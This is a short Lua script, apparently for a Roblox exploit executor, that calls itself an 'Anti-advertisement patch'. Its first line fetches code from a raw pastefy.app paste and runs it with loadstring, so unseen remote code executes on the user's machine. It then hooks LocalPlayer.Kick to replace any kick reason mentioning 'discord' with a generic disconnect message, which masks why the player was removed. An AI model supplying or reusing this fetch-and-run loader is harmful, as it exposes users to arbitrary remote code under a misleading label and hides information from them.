loadstring(game:HttpGet("https://pastefy.app/2QUNylbN/raw"))()
task.wait(0.1)

local oldKick = LocalPlayer.Kick
LocalPlayer.Kick = function(self, reason)
    if reason and string.find(reason:lower(), "discord") then
        oldKick(self, "Disconnected from server.")
    else
        oldKick(self, reason)
    end
end

print("Anti-advertisement patch loaded")
